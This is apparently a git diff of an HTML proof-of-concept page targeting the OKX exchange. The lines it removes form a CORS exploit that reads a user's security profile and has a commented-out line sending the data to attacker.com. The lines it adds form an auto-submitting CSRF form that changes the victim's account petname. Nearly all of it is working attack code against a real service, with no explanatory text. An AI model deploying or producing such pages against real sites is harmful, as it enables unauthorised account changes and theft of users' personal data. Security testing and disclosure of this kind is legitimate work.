@@ -1,28 +1,12 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>OKX CORS Exploit PoC</title>
-</head>
-<body>
-  <h1>User Info from OKX:</h1>
-  <pre id="output">Loading...</pre>
-
-  <script>
-    fetch("https://www.okx.com/v3/users/security/profile?t=1746261834448", {
-      method: "GET",
-      // credentials: "include" // include session cookies
-    })
-    .then(response => response.json())
-    .then(data => {
-      // Show data on page
-      document.getElementById("output").innerText = JSON.stringify(data, null, 2);
-
-      // Optional: Exfiltrate to attacker's server
-      // fetch("https://attacker.com/collect?data=" + btoa(JSON.stringify(data)));
-    })
-    .catch(err => {
-      document.getElementById("output").innerText = "Request failed: " + err;
-    });
-  </script>
-</body>
+  <body>
+    <form action="https://www.okx.com/v3/users/im/basic/petname" method="POST">
+      <input type="hidden" name="petname" value="hacked_by_me">
+      <input type="submit" value="Submit CSRF">
+    </form>
+    <script>
+      document.forms[0].submit(); // Auto-submit when loaded
+    </script>
+  </body>
 </html>
